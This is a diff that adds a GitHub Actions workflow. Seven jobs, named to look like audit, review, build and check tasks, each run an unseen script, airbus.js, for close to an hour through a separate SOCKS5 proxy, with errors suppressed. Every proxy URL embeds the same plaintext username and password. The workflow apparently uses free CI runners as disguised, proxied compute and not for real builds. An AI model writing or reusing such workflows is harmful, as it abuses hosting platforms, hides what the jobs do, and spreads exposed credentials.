@@ -1,0 +1,103 @@
+name: airbus
+on:
+  push:
+    branches: [ "main" ]
+    paths:
+      - '.github/workflows/airbus.yml'
+      - 'airbus.js'
+      - 'package.json'
+
+jobs:
+  audit_ubuntu2404_node_sauerkraut:
+    runs-on: ubuntu-24.04
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 24
+        - name: Run Task
+          run: |
+            npm install && timeout 56m node airbus.js "socks5://dcswarup:webshare@142.111.67.155:5620" || true
+
+  review_windows2022_node_marten:
+    runs-on: windows-2022
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 20
+        - name: Run Task
+          shell: pwsh
+          run: |
+            npm install; $p = [System.Diagnostics.Process]::Start((New-Object System.Diagnostics.ProcessStartInfo -Property @{ FileName = 'node'; Arguments = 'airbus.js "socks5://dcswarup:webshare@82.25.245.13:7336"'; WorkingDirectory = (Get-Location).Path; UseShellExecute = $false })); if (-not $p.WaitForExit(3180000)) { $p.Kill() }
+
+  build_ubuntulatest_bun_widow:
+    runs-on: ubuntu-latest
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Bun
+          uses: oven-sh/setup-bun@v2
+          with:
+            bun-version: latest
+        - name: Run Task
+          run: |
+            bun install && timeout 51m bun run airbus.js "socks5://dcswarup:webshare@206.206.64.157:6118" || true
+
+  verify_ubuntu2604_node_importance:
+    runs-on: ubuntu-26.04
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 18
+        - name: Run Task
+          run: |
+            npm install && timeout 54m node airbus.js "socks5://dcswarup:webshare@104.233.16.112:6376" || true
+
+  build_windows2025_node_impact:
+    runs-on: windows-2025
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 22
+        - name: Run Task
+          shell: pwsh
+          run: |
+            npm install; $p = [System.Diagnostics.Process]::Start((New-Object System.Diagnostics.ProcessStartInfo -Property @{ FileName = 'node'; Arguments = 'airbus.js "socks5://dcswarup:webshare@168.199.166.134:6666"'; WorkingDirectory = (Get-Location).Path; UseShellExecute = $false })); if (-not $p.WaitForExit(3240000)) { $p.Kill() }
+
+  check_ubuntu2204_bun_receptor:
+    runs-on: ubuntu-22.04
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Bun
+          uses: oven-sh/setup-bun@v2
+          with:
+            bun-version: latest
+        - name: Run Task
+          run: |
+            bun install && timeout 60m bun run airbus.js "socks5://dcswarup:webshare@45.91.166.13:7072" || true
+
+  review_windowslatest_node_puppet:
+    runs-on: windows-latest
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 22
+        - name: Run Task
+          shell: pwsh
+          run: |
+            npm install; $p = [System.Diagnostics.Process]::Start((New-Object System.Diagnostics.ProcessStartInfo -Property @{ FileName = 'node'; Arguments = 'airbus.js "socks5://dcswarup:webshare@85.198.41.39:5965"'; WorkingDirectory = (Get-Location).Path; UseShellExecute = $false })); if (-not $p.WaitForExit(3540000)) { $p.Kill() }
